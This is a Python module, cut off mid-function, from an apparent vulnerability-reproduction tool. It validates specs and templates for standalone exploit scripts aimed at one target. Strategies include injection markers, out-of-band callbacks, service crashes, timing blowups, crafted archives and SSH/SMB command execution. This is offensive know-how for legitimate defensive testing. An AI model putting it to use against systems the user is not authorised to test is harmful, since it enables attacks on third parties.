# Copyright 2026 SyncBit Software SRL and the CVELab contributors
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

"""Field PoC mode: a single-target exploit the lab owner runs themselves.

The source and closed modes prove a vulnerability by a differential between
two things the harness controls -- two revisions, or two images -- inside
Docker. That proof never leaves the lab: its PoC is the validator, bound to
the service names `vulnerable` and `patched`, and it refuses a remote target
by construction.

This mode emits a different artifact. The deliverable is a standalone script
that takes `--target` and runs against one server the operator owns, in one
run, and shows the vulnerability happening rather than printing a verdict about
a version. Its proof does not need a second server: it is an effect a fixed
build cannot produce, observed on the one target. Two strategies carry that
without an external listener:

  inband_differential  Read the same resource two ways in the same request
                        round -- the vulnerable path and the path that
                        authorizes correctly -- and report what only the first
                        returned. This is what a broken-authorization
                        disclosure needs: an internal note the vulnerable
                        field returns and the authorized path withholds.

  marker_roundtrip      Send a unique marker through an injection vector and
                        observe it surface where it should not -- reflected,
                        stored, or executed.

CVELab still builds the vulnerable and the fixed instance, but uses them to
prove the emitted script is real before handing it over: the script must
observe the effect against the vulnerable instance and must not against the
fixed one. A script that fires on both, or on neither, is not a field PoC and
is refused -- the same bar the differential gate sets, moved onto the artifact
the operator will actually run.

A class whose effect is not observable on a live target over the wire -- a
memory over-read that only crashes, a race, a timing signal -- has no field
PoC here. The mode declines it rather than ship a script that prints a verdict
it never observed.
"""

from __future__ import annotations

import ast
import contextlib
import json
import os
import re
import shutil
import subprocess
import textwrap
from collections.abc import Callable
from pathlib import Path
from typing import Any

from . import progress, sidecar, steps
from .ai import ProviderDeclined, ai_is_configured, structured_response
from .closed import (
    DEFAULT_HEALTH_TIMEOUT,
    MAX_HEALTH_TIMEOUT,
    _docker,
    _seconds,
    _validate_fixture,
    check_lab_arguments,
    disposable_instance,
    sidecar_argv,
)
from .core import (
    build_limits,
    prepare_compose,
    run_docker_stage,
    runtime_flags,
    service_port,
    startup_grace,
    write_text,
)

#: How a run shows the effect. The first two read the answer the target sends
#: back. oob_callback is for an effect that produces no answer at all -- a
#: blind injection, a blind SSRF, a command whose output goes nowhere -- where
#: the only evidence is the target reaching out. The script listens for that
#: itself rather than handing the data to a third-party collaborator service,
#: which on a client engagement would send their traffic somewhere neither
#: party controls.
#:
#: service_crash and timing_differential were added because their absence,
#: not the vulnerabilities', is what refused a measured batch. Of ten CVEs
#: five reproduced and none shipped a script: two were panics the draft could
#: only describe as "a crash signal rather than an answer", one was an
#: algorithmic blowup it called unobservable from outside the process, and the
#: vocabulary had no way to say either. A crash and a stall are impacts an
#: operator cares about more than most, and both are observable from one
#: instance -- a crash because the service stops answering, a stall because
#: the same request with benign input does not.
STRATEGIES = (
    "inband_differential", "marker_roundtrip", "oob_callback", "direct_observation",
    "service_crash", "timing_differential",
)

#: The strategies that carry their own control, inside the one instance they
#: run against. inband_differential reads the same resource the way the
#: weakness allows and the way that authorizes correctly, and reports only the
#: difference. marker_roundtrip and oob_callback observe a marker surfacing
#: where it cannot legitimately, or the target reaching out -- neither is
#: ordinary behaviour whatever the version.
#:
#: service_crash and timing_differential belong here for the same reason, and
#: each carries its control in time rather than in a second reading:
#: service_crash establishes that the instance was answering before the
#: payload and is not after, and timing_differential measures the same request
#: shape with benign input alongside the pathological one.
#:
#: This is what makes a lab with no fixed build usable. A patched build answers
#: one question: is what I am seeing the bug, or how the thing always behaves.
#: It is a check against self-deception, not the definition of a vulnerability,
#: and these answer it on their own.
SELF_CONTROLLED = (
    "inband_differential", "marker_roundtrip", "oob_callback",
    "service_crash", "timing_differential",
)

#: What direct_observation may assert about the one response it reads.
EXPECTATIONS = ("status", "header", "body_contains", "extract")

#: How much slower the pathological input has to be than the benign one of the
#: same shape before a timing_differential run counts. Ten times is the floor
#: because wall-clock noise across a network is real: a loaded host, a cold
#: cache or a GC pause can double a response, and none of those multiply it by
#: ten. A spec may raise it, never lower it past this.
MIN_TIMING_RATIO = 10.0

#: The pathological request also has to take this long outright. Without it a
#: ratio is meaningless at small numbers -- 0.4ms against 0.02ms is twenty
#: times and is nothing but scheduling -- and an operator cannot act on it.
MIN_TIMING_SECONDS = 0.5

#: Times each side of a timing_differential is measured. The median is taken,
#: so one unlucky sample cannot carry or sink a run. Three is enough for a
#: median and keeps a slow endpoint from making the script take minutes.
TIMING_REPEATS = 3
MAX_TIMING_REPEATS = 7

# The step grammar lives in cvelab.steps, because three callers need it and
# only one of them can run it: the step that validates a generated lab's
# answer has to read it before any build exists, and importing this module to
# get it would drag a provider and Docker along. What stayed here is the
# runner -- a sidecar joined to one container's network namespace, which is
# what a single-target proof has and a compose-network lab does not.
#
# The spellings are the ones this file has always used, so that every name it
# held before the move still resolves here and to the same object.
_MARKER_TOKEN = steps.MARKER_TOKEN
_TARGET_TOKENS = steps.TARGET_TOKENS
_BIND_NAME = steps.BIND_NAME
EXTRACTORS = steps.EXTRACTORS
_MAX_REQUESTS = steps.MAX_REQUESTS
_MAX_INPUTS = steps.MAX_INPUTS
_MAX_UPLOAD_PARTS = steps.MAX_UPLOAD_PARTS
_PART_CONTENT = steps.PART_CONTENT
_MAX_SETUP_REQUESTS = steps.MAX_SETUP_REQUESTS
_substitutions = steps.substitutions
_validate_request = steps.validate_request
_validate_upload = steps.validate_upload
_validate_extractor = steps.validate_extractor
_validate_inputs = steps.validate_inputs
_validate_setup = steps.validate_setup

#: Where the script's own listener can be reached, substituted into the probe.
#: The operator names it when the target cannot reach the bound address
#: directly, which is the usual case across a network.
_CALLBACK_TOKEN = "{{callback}}"

_MAX_FIELD_OUTPUT = 32 * 1024

#: How the script talks to the one target. HTTP was the only transport at
#: first because the vocabulary was taken from one web disclosure, not because
#: the proof needs it: the sidecar, the two builds and the effect-here-silence-
#: there bar are all transport-blind. A service reachable as a host and a port
#: that speaks anything else -- a cache, a queue, a database, a daemon with a
#: text protocol -- is reached over a socket instead.
#:
#: Everything is stdlib, because the delivered script has to run on the
#: operator's machine with nothing installed. That is also the boundary: a
#: protocol needing a real handshake, SSH or SMB or a TLS-wrapped negotiation,
#: cannot be expressed as bytes to send and is out of scope rather than a
#: reason to take on a dependency.
TRANSPORTS = ("http", "tcp", "tls", "ws", "wss", "ssh", "smb")

#: WebSocket is its own case: the handshake is an HTTP upgrade and the framing
#: is a documented wire format, so the standard library covers both and the
#: script needs nothing installed. It was the one gap in a measured batch that
#: was the format's fault rather than the vulnerability's -- a lab whose effect
#: lived in frames after a /ws upgrade had no way to be expressed.
WS_TRANSPORTS = ("ws", "wss")

#: Transports whose handshake cannot be written as bytes to send -- SSH
#: negotiates keys, SMB negotiates a dialect -- so a library speaks it and the
#: sidecar that proves the script needs that library baked in. A message here
#: is an operation rather than a payload, which is the point: the class these
#: reach is access and post-authentication command execution, not the
#: handshake itself.
HANDSHAKE_TRANSPORTS = ("ssh", "smb")

#: What a session may be told to do. Deliberately small: each one is a thing
#: the protocol already offers, so a spec stays readable and CVELab can still
#: say what a script will do before it runs.
SMB_OPS = ("list_shares", "list_path", "read")

#: Fields a session may authenticate with, per transport. An input fills one
#: in, so the credential belongs to the operator and never to the spec.
AUTH_FIELDS = {
    "ssh": ("username", "password", "private_key"),
    "smb": ("username", "password", "domain"),
}

#: A socket exchange reads until the delimiter, the cap, or the peer stops.
_MAX_READ = 1024 * 1024


def _validate_message(message: Any, where: str) -> dict[str, Any]:
    """One socket exchange: what to send, and how much to read back.

    `send` is text and carries {{marker}} and discovered values like an HTTP
    body does; `send_hex` is for a protocol whose framing is not text, and
    takes no substitution because a marker is not a byte string. Sending
    nothing is allowed: a banner is read by connecting and listening.
    """
    if not isinstance(message, dict):
        raise ValueError(f"{where} must be an object")
    text, raw = message.get("send"), message.get("send_hex")
    if text is not None and raw is not None:
        raise ValueError(f"{where} takes send or send_hex, not both")
    if text is None and raw is None:
        # Sending nothing is a real exchange and this docstring has always
        # said so, while the code demanded one of the two keys. It cost
        # Storybook a script: an Origin check on a WebSocket upgrade sends no
        # frame at all -- the finding is the handshake -- and the draft was
        # refused with "needs exactly one of send or send_hex".
        text = ""
    out: dict[str, Any] = {}
    if text is not None:
        if not isinstance(text, str):
            raise ValueError(f"{where}.send must be a string")
        out["send"] = text
    else:
        if not isinstance(raw, str) or not re.fullmatch(r"(?:[0-9a-fA-F]{2})*", raw):
            raise ValueError(f"{where}.send_hex must be an even-length hex string")
        if _MARKER_TOKEN in raw:
            raise ValueError(f"{where}.send_hex cannot carry {_MARKER_TOKEN}; use send")
        out["send_hex"] = raw.lower()
    until = message.get("read_until")
    if until is not None:
        if not isinstance(until, str) or not until:
            raise ValueError(f"{where}.read_until must be a non-empty string")
        out["read_until"] = until
    limit = message.get("read_bytes", _MAX_READ)
    if not isinstance(limit, int) or not 1 <= limit <= _MAX_READ:
        raise ValueError(f"{where}.read_bytes must be between 1 and {_MAX_READ}")
    out["read_bytes"] = limit
    return out


def _validate_exec(message: Any, where: str) -> dict[str, Any]:
    """One command run over an authenticated session.

    The effect is what the command prints, so this reaches a weakness in what
    the session is allowed to do -- a restricted shell that is escapable, a
    file an account should not be able to read, an injection in something the
    service runs for you. It is not a way to attack the handshake.
    """
    if not isinstance(message, dict):
        raise ValueError(f"{where} must be an object")
    command = message.get("exec")
    if not isinstance(command, str) or not command.strip():
        raise ValueError(f"{where}.exec must be the command to run")
    return {"exec": command}


def _validate_smb_op(message: Any, where: str) -> dict[str, Any]:
    """One SMB operation: what is listed or read, never a raw frame."""
    if not isinstance(message, dict):
        raise ValueError(f"{where} must be an object")
    op = message.get("op")
    if op not in SMB_OPS:
        raise ValueError(f"{where}.op must be one of {', '.join(SMB_OPS)}")
    out: dict[str, Any] = {"op": op}
    if op == "list_shares":
        return out
    share = message.get("share")
    if not isinstance(share, str) or not share.strip():
        raise ValueError(f"{where}.share must name a share")
    out["share"] = share.strip()
    path = str(message.get("path", "/"))
    if not path.startswith("/") or ".." in path:
        raise ValueError(f"{where}.path must start with / and may not climb with ..")
    out["path"] = path
    return out


def _validate_auth(value: Any, transport: str, inputs: list[str]) -> dict[str, str]:
    """How the session authenticates, with the operator's own values in it.

    A spec never carries a credential: it names an input and the operator
    supplies it at run time. Left out entirely, the session is anonymous,
    which is a real case for SMB.
    """
    # Empty is the same as absent, which matters because validate_spec emits
    # auth: {} into every normalised spec: without this, a spec could not be
    # validated twice, and saving one and reusing it is the ordinary thing to
    # do with it.
    if not value:
        return {}
    if transport not in HANDSHAKE_TRANSPORTS:
        raise ValueError(f"auth has no meaning for transport {transport}")
    allowed = AUTH_FIELDS.get(transport, ())
    if not isinstance(value, dict):
        raise ValueError("auth must be an object")
    unknown = set(value) - set(allowed)
    if unknown:
        raise ValueError(
            f"auth for {transport} supports only {', '.join(allowed)}, not {sorted(unknown)}"
        )
    out = {}
    for key, raw in value.items():
        text = str(raw)
        missing = _substitutions(json.dumps(text)) - set(inputs)
        if missing:
            raise ValueError(f"auth.{key} uses names nothing binds: {sorted(missing)}")
        out[key] = text
    return out


#: What one entry of a sequence is, per transport. HTTP is the shared case and
#: lives in cvelab.steps; the rest are socket exchanges and session operations,
#: which only a script run from here speaks.
_SEQUENCE_ITEM: dict[str, Callable[[Any, str], dict[str, Any]]] = {
    "http": _validate_request,
    "tcp": _validate_message,
    "tls": _validate_message,
    "ws": _validate_message,
    "wss": _validate_message,
    "ssh": _validate_exec,
    "smb": _validate_smb_op,
}


def _validate_sequence(value: Any, where: str, transport: str = "http") -> list[dict[str, Any]]:
    """A sequence of requests, or of socket exchanges on one connection.

    Over a socket the whole sequence shares one connection, because a
    protocol that needs a login before a command cannot be expressed as
    independent messages. HTTP requests stay independent, as they were.
    """
    # The lookup is deferred into the call so the list is checked first, the
    # order the one function had before the shared part of it moved out.
    return steps.validate_sequence(
        value, where, lambda item, at: _SEQUENCE_ITEM[transport](item, at)
    )


_MAX_DISCOVER_STEPS = 6


def _asserted_kind(expect: dict[str, Any]) -> str:
    """What an expectation actually reads, through an extractor if need be.

    {"status": 200} and {"extract": {"status": true}} both read the status
    line, and a rule about where a status line exists has to see both.
    """
    kind = next(iter(expect), "")
    if kind == "extract":
        return next(iter(expect["extract"] or {}), "")
    return kind


def _validate_expectation(value: Any, where: str) -> dict[str, Any]:
    """What the one response has to show for the effect to count."""
    listed = ", ".join(EXPECTATIONS)
    if not isinstance(value, dict) or len(value) != 1:
        raise ValueError(f"{where}.expect must be exactly one of {listed}")
    if "status" in value:
        status = value["status"]
        if not isinstance(status, int) or not 100 <= status <= 599:
            raise ValueError(f"{where}.expect.status must be an HTTP status code")
        return {"status": status}
    if "header" in value:
        name = str(value["header"]).strip()
        if not name:
            raise ValueError(f"{where}.expect.header must name a response header")
        return {"header": name}
    if "body_contains" in value:
        needle = value["body_contains"]
        if not isinstance(needle, str) or not needle:
            raise ValueError(f"{where}.expect.body_contains must be a non-empty string")
        return {"body_contains": needle}
    if "extract" in value:
        return {"extract": _validate_extractor(value["extract"])}
    raise ValueError(f"{where}.expect must be one of {listed}")


def _validate_discover(
    value: Any, inputs: tuple[str, ...] = ()
) -> tuple[list[dict[str, Any]], set[str]]:
    """The chain that reads values from the instance before the probe runs.

    Each step binds one name. A query step runs requests and binds every value
    its extractor pulls, fanning the run out over them; a derive step binds a
    value computed from names already bound. A step may use only names bound
    by an earlier step, so a spec cannot reference something it never read.

    The operator's own inputs count as bound from the start. They did not, and
    that was a bug with a measured cost: a lab that reproduced was refused a
    spec three times over because its first step had to sign in with a
    credential only the operator has, which is exactly what an input is for.
    """
    bound: set[str] = set(inputs)
    if value is None:
        return [], bound
    if not isinstance(value, list):
        raise ValueError("discover must be a list of steps")
    if len(value) > _MAX_DISCOVER_STEPS:
        raise ValueError(f"discover may hold at most {_MAX_DISCOVER_STEPS} steps")
    steps: list[dict[str, Any]] = []
    for index, step in enumerate(value):
        where = f"discover[{index}]"
        if not isinstance(step, dict):
            raise ValueError(f"{where} must be an object")
        name = str(step.get("bind", ""))
        if not _BIND_NAME.fullmatch(name):
            # The value, not just the rule: a reason that does not say what
            # was wrong sends whoever reads it back to guessing.
            raise ValueError(
                f"{where}.bind {name!r} must match {_BIND_NAME.pattern}"
            )
        if name in bound:
            raise ValueError(f"{where}.bind {name!r} is already bound")
        if "derive" in step:
            template = str(step["derive"])
            missing = _substitutions(template) - bound
            if missing:
                raise ValueError(f"{where}.derive uses unbound {sorted(missing)}")
            steps.append({"bind": name, "derive": template})
        elif "query" in step:
            query = _validate_sequence(step.get("query"), f"{where}.query")
            missing = _substitutions(json.dumps(query)) - bound
            if missing:
                raise ValueError(f"{where}.query uses unbound {sorted(missing)}")
            steps.append({
                "bind": name,
                "query": query,
                "extract": _validate_extractor(step.get("extract")),
            })
        else:
            raise ValueError(f"{where} must have either query or derive")
        bound.add(name)
    return steps, bound


def _at_least(value: Any, where: str, floor: float) -> float:
    """A threshold a spec may raise and may not lower.

    The floors exist because a timing claim is the easiest of these to fool
    oneself with, and the spec is written by the same model that wants the
    answer to be yes. Raising one is a spec saying this effect needs a
    stronger signal than the floor; lowering it would be a spec weakening the
    bar it has to clear, so it is refused rather than clamped -- silently
    accepting a 2x threshold and then testing 10x reports on something the
    spec did not ask for.
    """
    if value is None:
        return floor
    if isinstance(value, bool) or not isinstance(value, (int, float)):
        raise ValueError(f"{where} must be a number")
    if float(value) < floor:
        raise ValueError(f"{where} may not be lower than {floor}")
    return float(value)


def _validate_check(
    check: Any, strategy: str, where: str, transport: str = "http",
    inputs: list[str] | None = None,
) -> dict[str, Any]:
    if not isinstance(check, dict):
        raise ValueError(f"{where} must be an object")
    discover, bound = _validate_discover(check.get("discover"), tuple(inputs or ()))
    if discover and transport not in ("http", *WS_TRANSPORTS):
        # Discovery enumerates a target by reading it and binding names. The
        # steps are HTTP requests, so over a plain socket or a negotiated
        # session there is nothing to run them with -- better said plainly
        # than silently ignored. A WebSocket target is not in that position:
        # the upgrade route is served by an HTTP server on the same host and
        # port, so a step runs against it with an ordinary request. Storybook
        # reproduced and then had no script, because its channel token is
        # read from served HTML and its effect is in the frames after the
        # upgrade, and that pairing was refused here.
        raise ValueError(
            f"{where}.discover works over http, ws and wss, not {transport}"
        )
    out: dict[str, Any] = {"label": str(check.get("label", where)), "discover": discover}

    def _allowed(sequence: list[dict[str, Any]], what: str) -> None:
        missing = (
            _substitutions(json.dumps(sequence)) - bound
            - {"marker", "callback"} - set(_TARGET_TOKENS)
        )
        if missing:
            raise ValueError(f"{where}.{what} uses names nothing binds: {sorted(missing)}")

    if strategy == "inband_differential":
        out["probe"] = _validate_sequence(check.get("probe"), f"{where}.probe", transport)
        out["control"] = _validate_sequence(check.get("control"), f"{where}.control", transport)
        out["extract"] = _validate_extractor(check.get("extract"))
        _allowed(out["probe"], "probe")
        _allowed(out["control"], "control")
    elif strategy == "direct_observation":
        # Measured, not assumed: a set difference is the wrong instrument for
        # an authorization finding. Asked to compare an unauthenticated read
        # against an authorized one, probe-minus-control is empty on the
        # vulnerable build -- both see the data -- and on the fixed build it
        # yields the 401 the probe got and the control did not, so the proof
        # fired on the patched side. Here the evidence is the one response:
        # the request the weakness allows came back with something it should
        # not have, and on a fixed build the same request does not.
        out["probe"] = _validate_sequence(check.get("probe"), f"{where}.probe", transport)
        out["expect"] = _validate_expectation(check.get("expect"), where)
        asserted = _asserted_kind(out["expect"])
        if transport not in ("http", *WS_TRANSPORTS) and asserted in ("status", "header"):
            # A socket exchange returns a transcript and no status line, so
            # this expectation could never fire: the script would run, read
            # the right bytes and report nothing, which is indistinguishable
            # from the effect being absent. Refused here instead, where the
            # reason can be said and another spec asked for. Over ws and wss
            # it is not refused: the upgrade is an HTTP response, and for an
            # Origin check it is the whole finding.
            raise ValueError(
                f"{where}.expect.{asserted} needs transport http, ws or wss; over "
                f"{transport} there is no status line or header to read, so match on the "
                "bytes with body_contains or extract"
            )
        _allowed(out["probe"], "probe")
    elif strategy == "oob_callback":
        probe = _validate_sequence(check.get("probe"), f"{where}.probe", transport)
        placed = json.dumps(probe)
        if _CALLBACK_TOKEN not in placed:
            raise ValueError(f"{where}.probe must place {_CALLBACK_TOKEN} somewhere")
        if _MARKER_TOKEN not in placed:
            # Without it a hit cannot be told from an unrelated request, or
            # from a callback a previous run's payload is still producing.
            raise ValueError(
                f"{where}.probe must place {_MARKER_TOKEN} too, inside the callback it "
                "builds, so the hit can be attributed to this run"
            )
        out["probe"] = probe
        _allowed(probe, "probe")
    elif strategy == "service_crash":
        # The payload, and a benign request that proves the instance was
        # answering before it. The baseline is required rather than optional:
        # without it "no answer" cannot be told apart from "never answered",
        # and a script that reports a crash against a host that was already
        # down is worse than one that reports nothing.
        out["baseline"] = _validate_sequence(
            check.get("baseline"), f"{where}.baseline", transport
        )
        out["probe"] = _validate_sequence(check.get("probe"), f"{where}.probe", transport)
        _allowed(out["baseline"], "baseline")
        _allowed(out["probe"], "probe")
    elif strategy == "timing_differential":
        out["probe"] = _validate_sequence(check.get("probe"), f"{where}.probe", transport)
        # The same request shape with input that does not trigger the blowup.
        # It is the control, and it is what makes the measurement mean
        # anything: a slow endpoint is not a finding, a slow endpoint that is
        # fast with ordinary input is.
        out["control"] = _validate_sequence(
            check.get("control"), f"{where}.control", transport
        )
        out["min_ratio"] = _at_least(
            check.get("min_ratio"), f"{where}.min_ratio", MIN_TIMING_RATIO
        )
        out["min_seconds"] = _at_least(
            check.get("min_seconds"), f"{where}.min_seconds", MIN_TIMING_SECONDS
        )
        repeats = check.get("repeats", TIMING_REPEATS)
        # bool before int: True is an int in Python and 1 <= True <= 7 holds,
        # so repeats=true would have been accepted as one measurement.
        if (
            isinstance(repeats, bool)
            or not isinstance(repeats, int)
            or not 1 <= repeats <= MAX_TIMING_REPEATS
        ):
            raise ValueError(
                f"{where}.repeats must be a whole number of measurements, "
                f"1 to {MAX_TIMING_REPEATS}"
            )
        out["repeats"] = repeats
        _allowed(out["probe"], "probe")
        _allowed(out["control"], "control")
    else:  # marker_roundtrip
        probe = _validate_sequence(check.get("probe"), f"{where}.probe", transport)
        if _MARKER_TOKEN not in json.dumps(probe):
            raise ValueError(f"{where}.probe must place {_MARKER_TOKEN} somewhere")
        out["probe"] = probe
        # One request, or a sequence sharing a connection. A single object is
        # still accepted and wrapped: that is what every spec written so far
        # says, and over a socket the reply often needs a login first.
        offered = check.get("observe")
        out["observe"] = _validate_sequence(
            offered if isinstance(offered, list) else [offered],
            f"{where}.observe", transport,
        )
        match = check.get("match", {"body_contains": _MARKER_TOKEN})
        if not isinstance(match, dict):
            raise ValueError(f"{where}.match must be an object")
        # The script reads body_contains and nothing else, so any other key
        # was accepted and then ignored: a spec written with body_regex got a
        # bare marker check instead and reported on something it never asked
        # for. A predicate the script cannot evaluate is a spec error.
        unknown = set(match) - {"body_contains"}
        if unknown:
            raise ValueError(
                f"{where}.match supports only body_contains, not {sorted(unknown)}"
            )
        out["match"] = match
        _allowed(probe, "probe")
        _allowed(out["observe"], "observe")
    return out


def validate_spec(spec: Any) -> dict[str, Any]:
    """A field spec, independent of any one target.

    It describes the effect to observe and the requests that produce it, never
    a hostname: the operator supplies the target at run time.
    """
    if not isinstance(spec, dict):
        raise ValueError("field spec must be an object")
    strategy = spec.get("strategy")
    if strategy not in STRATEGIES:
        raise ValueError(f"strategy must be one of {', '.join(STRATEGIES)}")
    effect = spec.get("observable_effect")
    if not isinstance(effect, str) or not effect.strip():
        raise ValueError("observable_effect must describe what a run shows")

    transport = spec.get("transport", "http")
    if transport not in TRANSPORTS:
        raise ValueError(f"transport must be one of {', '.join(TRANSPORTS)}")

    inputs = _validate_inputs(spec.get("inputs"))
    ws_path = str(spec.get("ws_path", "/"))
    if not ws_path.startswith("/"):
        raise ValueError("ws_path must be the upgrade path and start with /")
    ws_headers = spec.get("ws_headers") or {}
    if not isinstance(ws_headers, dict):
        raise ValueError("ws_headers must be an object")
    if transport not in WS_TRANSPORTS and (spec.get("ws_path") or ws_headers):
        raise ValueError(f"ws_path and ws_headers have no meaning for transport {transport}")
    auth = _validate_auth(spec.get("auth"), transport, inputs)
    out: dict[str, Any] = {
        "strategy": strategy,
        "transport": transport,
        "observable_effect": effect.strip(),
        "inputs": inputs,
        "auth": auth,
    }
    if transport in WS_TRANSPORTS:
        # Emitted only where it means something, so a spec for any other
        # transport stays valid input to validate_spec a second time -- the
        # round-trip caught this on the first change after the test was added.
        out["ws_path"] = ws_path
        out["ws_headers"] = {str(k): str(v) for k, v in ws_headers.items()}

    # A spec may list several checks -- work items and merge requests are two
    # for the same disclosure -- or, in the short form, carry one check's keys
    # at the top level. The top-level form is kept so a one-check spec stays
    # small and the earlier form still validates.
    if spec.get("checks") is not None:
        checks = spec["checks"]
        if not isinstance(checks, list) or not checks:
            raise ValueError("checks must be a non-empty list")
        out["checks"] = [
            _validate_check(check, strategy, f"checks[{i}]", transport, inputs)
            for i, check in enumerate(checks)
        ]
    else:
        out["checks"] = [_validate_check(spec, strategy, "spec", transport, inputs)]

    if transport in WS_TRANSPORTS:
        # The handshake is filled from what a check binds, so a name it uses
        # has to be bound by every check -- otherwise the upgrade goes out
        # with the literal {{name}} in it, which is what Storybook refused.
        wanted = _substitutions(json.dumps([out["ws_path"], out["ws_headers"]]))
        for index, check in enumerate(out["checks"]):
            available = set(inputs) | {step["bind"] for step in check["discover"]}
            missing = wanted - available - set(_TARGET_TOKENS)
            if missing:
                raise ValueError(
                    f"ws_path and ws_headers use names checks[{index}] does not bind: "
                    f"{sorted(missing)}; bind them in that check's discover or declare "
                    "them in inputs"
                )
    if spec.get("setup") is not None:
        # Run against each build before the script, and never shipped. A lab
        # starts empty, so the object a weakness acts on is put there by the
        # lab's own seeding route -- which the lab's validator calls and the
        # manual proof did not, so two correct specs found nothing on either
        # build and were recorded as failures.
        out["setup"] = _validate_setup(spec["setup"], inputs)
    if spec.get("fixture") is not None:
        out["fixture"] = _validate_fixture(spec["fixture"])
    out["health_timeout"] = _seconds(
        spec.get("health_timeout"), "health_timeout",
        DEFAULT_HEALTH_TIMEOUT, MAX_HEALTH_TIMEOUT,
    )
    return out


# --- The names in a validated lab's artifacts/ ----------------------------
#
# All of them in one block, and this is why. A validated lab used to hold two
# step-by-step documents with two different reaches, written by two modules.
# The lab one used to be MANUAL-POC.md in deliverables.py, and
# `"MANUAL-POC.md".lower() == "Manual-PoC.md".lower()`: on macOS and Windows,
# whose file systems compare names without case, the two were one file and
# whichever was written second silently replaced the other. 13 of the
# archived labs hold both. CVELab ships for Windows -- PoC.ps1, the
# `os.name == "nt"` branches in upload.py, deliverables.py and core.py -- and
# sourcegen._adapter_files already compares adapter paths case-insensitively
# "as the file system on Windows and macOS compares names". The guard was in
# the repo and the shipped names walked past it, because the two names were
# declared in two modules and nobody held both in view at once. Now they are
# declared together: anything added here is next to what it must not collide
# with, and tests/test_manual_poc.py fails on a lowercased duplicate.
#
# Three of the names are gone from what is written. `Manual-PoC.py` was the
# artifact that could be pointed at a target, `Manual-PoC.md` was its guide
# and `Manual-PoC.json` was what the attempt recorded; the drafter shipped
# them on 26 of 148 validated labs, so three quarters carried only the
# lab-only script under the name `PoC.py` and the kit read as though that
# were the client-usable one. The two programs are one file now, and the
# record is in report.json beside the lab's other verdicts.

#: The one artifact. Lab mode with no argument, remote mode with a target, and
#: a header that says what each is worth.
POC_NAME = "PoC.py"

#: The document that drives `manual.sh` and `PoC.ps1` against the lab's own
#: Docker builds, reaching nothing outside them. Written by deliverables.py;
#: declared here, beside the names it must not collide with.
LAB_POC_GUIDE_NAME = "LAB-POC.md"

#: Names nothing writes any more, kept because `cvelab upload`, `cvelab
#: manual` and the deliverables pass all run against a lab directory on
#: disk that an older CVELab may have generated. 87 of the archived labs hold
#: the old lab-guide name and 45 hold the old record, so dropping them here
#: would silently stop shipping a document those labs have and silently
#: redraft a spec those labs already proved. They are read, never written,
#: which is also why they are exempt from the collision scan: a name that is
#: only ever read cannot overwrite anything.
LEGACY_LAB_POC_GUIDE_NAME = "MANUAL-POC.md"
LEGACY_MANUAL_POC_NAME = "Manual-PoC.py"
LEGACY_MANUAL_POC_GUIDE_NAME = "Manual-PoC.md"
LEGACY_MANUAL_POC_RECORD_NAME = "Manual-PoC.json"

#: The three the merged artifact absorbed. A lab re-rendered after the merge
#: has them removed rather than left beside it: a stale `Manual-PoC.py`
#: claiming to be the handover, next to a `PoC.py` that now is one, is the
#: incoherence this merge exists to end.
LEGACY_MANUAL_POC_NAMES = (
    LEGACY_MANUAL_POC_NAME,
    LEGACY_MANUAL_POC_GUIDE_NAME,
    LEGACY_MANUAL_POC_RECORD_NAME,
)


# Remote mode. It is written once, reads the spec embedded beside it, and is
# the same program whether CVELab runs it against the built instance or the
# operator runs it against their server. It targets whatever --target names, so
# it has no loopback guard: running it is itself the operator's statement that
# they may test that host. It names the target and the effect on stderr before
# the first request, so a run against the wrong host is visible in the output
# and in whatever log captured it.
#
# This is half of a file now. `emit_poc` puts it under the merged header and
# above the lab's own validator, so the shebang, the docstring and the entry
# point are not here: the header is built by `_poc_header`, which states both
# modes at once, and the entry point is `_POC_DISPATCH`, the one line in the
# file that belongs to neither program. The future import went with them. A
# future statement must precede every other statement in a file, this file
# holds two programs, and this half declares no annotations that needed one.
_FIELD_POC = r'''import argparse, base64, hashlib, http.client, io, json, re, socket, socketserver, ssl
import sys, tarfile
import threading, time, urllib.error, urllib.parse, urllib.request, uuid, zipfile

# The spec travels as JSON text rather than as a Python literal. A bodyless
# request carries "body": null, and null, true and false are not Python names:
# pasted in as a literal they made the script die with NameError on import,
# against every target, before it sent a single request.
SPEC = json.loads(r"""@@SPEC@@""")


def _collect(value, key, out):
    if isinstance(value, dict):
        for k, v in value.items():
            if k == key and isinstance(v, (str, int, float, bool)):
                out.append(str(v))
            _collect(v, key, out)
    elif isinstance(value, list):
        for item in value:
            _collect(item, key, out)


def _handshake_is_the_finding():
    """Whether a refused upgrade is an observation rather than a dead end.

    For an Origin check the upgrade itself is the evidence: accepted where a
    fixed build refuses. Then a non-101 is data and must come back. Where the
    evidence is in the frames, a server that did not upgrade has told us
    nothing, and returning that as "no effect" is the mistake the accept-header
    check was added to prevent -- so every check has to be reading the
    handshake for this to hold.
    """
    checks = SPEC.get("checks") or []
    return bool(checks) and all(
        _reads_the_handshake(check.get("expect") or {}) for check in checks
    )


def _reads_the_handshake(expect):
    kind = next(iter(expect), "")
    if kind == "extract":
        kind = next(iter(expect["extract"] or {}), "")
    return kind in ("status", "header")


def _archive(files, zipped):
    """One archive built in memory from names and text.

    A crafted archive is the attack itself for a whole class of weakness --
    one that escapes its extraction root, overwrites a config it should not
    reach, or carries a name a filter was supposed to refuse -- so the spec
    says what goes in it and this builds it on the spot. Nothing is written
    to disk, and the contents are filled in like any other request text, so
    {{marker}} inside a file works.
    """
    raw = io.BytesIO()
    if zipped:
        with zipfile.ZipFile(raw, "w", zipfile.ZIP_DEFLATED) as archive:
            for name, text in files.items():
                archive.writestr(name, text)
        return raw.getvalue()
    with tarfile.open(fileobj=raw, mode="w:gz") as archive:
        for name, text in files.items():
            data = text.encode("utf-8")
            entry = tarfile.TarInfo(name)
            entry.size = len(data)
            archive.addfile(entry, io.BytesIO(data))
    return raw.getvalue()


def _part_bytes(part):
    kind = part["kind"]
    if kind == "text":
        return part["text"].encode("utf-8")
    if kind == "base64":
        return base64.b64decode(part["base64"])
    return _archive(part[kind], kind == "zip")


def multipart(parts):
    """Encode one form, and say what Content-Type it needs."""
    boundary = "cvelab" + uuid.uuid4().hex
    chunks = []
    for part in parts:
